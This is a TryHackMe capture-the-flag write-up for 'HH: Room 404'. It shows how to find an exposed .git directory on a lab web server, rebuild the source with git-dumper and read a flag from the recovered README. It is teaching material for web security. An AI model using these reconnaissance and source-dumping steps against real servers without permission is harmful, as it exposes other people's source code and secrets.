# 🏨 HH: Room 404 — Hacker's Holiday Day 2

| Field | Details |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [HH: Room 404](https://tryhackme.com/room/hh-room404-804573bf) |
| **Difficulty** | ℹ️ Very Easy |
| **Category** | Web, Information Disclosure, Git Exposure |
| **Event** | Hacker's Holiday 2026 — The Byte Lotus Hotel |
| **Tools** | dirsearch, git-dumper, browser |

---

## 🎯 Objective

The Byte Lotus guest-experience platform was deployed in a hurry. The night-shift developer "shipped more than the website." Find what was left behind on port 8080.

---

## 🔍 Reconnaissance

```bash
dirsearch -u http://TARGET_IP:8080/ -e php,txt,html,js
```

Automated fuzzing finds nothing obvious. Switch to manually checking common version control paths:

```
http://TARGET_IP:8080/.git/
```

**Directory listing enabled — exposed `.git/` repository confirmed.**

---

## 💥 Exploitation — Git Source Disclosure

Use `git-dumper` to reconstruct the full repository:

```bash
pip install git-dumper
git-dumper http://TARGET_IP:8080/.git/ dumped_repo
cd dumped_repo && ls -la
```

Files recovered: `app.js`, `index.html`, `README.md`

---

## 🏁 Flag

```bash
cat README.md
# Contains internal staging notes — flag embedded in the file
```

---

## 📚 Lessons Learned

- Always check `/.git/`, `/.svn/`, `/.env` manually — wordlists often miss them
- Exposed `.git/` directories allow full source reconstruction offline
- `git-dumper` automates fetching compressed Git objects over HTTP
- Never deploy version control directories to production web servers

---
*by OwlRC 🦉 | github.com/OwlRC*
